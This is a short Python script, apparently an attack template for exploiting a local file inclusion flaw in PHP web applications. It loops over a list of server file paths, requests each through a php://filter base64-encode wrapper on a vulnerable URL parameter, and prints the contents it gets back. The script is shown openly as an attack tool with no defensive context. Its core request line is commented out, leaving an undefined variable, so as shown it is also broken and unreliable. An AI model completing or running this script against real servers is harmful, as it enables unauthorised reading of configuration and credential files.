import requests
import time
import urllib
import base64
import os.path
import argparse

parser = argparse.ArgumentParser(description='Abuse LFI through PHP filters')
parser.add_argument('url', type=str, help='URL including the vulnerable parameter at the end')
args = parser.parse_args()


files = set()
with open('files.txt') as f:
    for line in f:
      if (line[0] != "#"):
        files.add(line.rstrip(' ').rstrip('\n'))

print(files)
print("\n-----")

# TODO: replace with the appropriate code the exploit this particular vulnerability                                                                                                                             
def exploitLFI(URL, filename):
#  repla = requests.get(URL + "php://filter/read=convert.base64-encode/resource=" + urllib.quote_plus(filename))                                                                                                 
  if (repla.status_code == 200):
    print("FILE : " + filename)
    print(repla.text)
    print("---------------")
  else:
    print("STATUS : " + str(repla.status_code))
  return repla

count = 0
for lfi in files:
    print("Still trying.. " + lfi)
    time.sleep(0.05)
    fn = lfi.split("/")[-1] + ".BAR"
    if (not (os.path.isfile(fn))):
      reply = exploitLFI(args.url, lfi)
      # TODO: to write files locally for later examination, do something here.
      #    with open(fn, "w") as f:                                                                                                                                                                               
      #      f.write(reply.text)                                                                                                                                                                                  
    count = count + 1

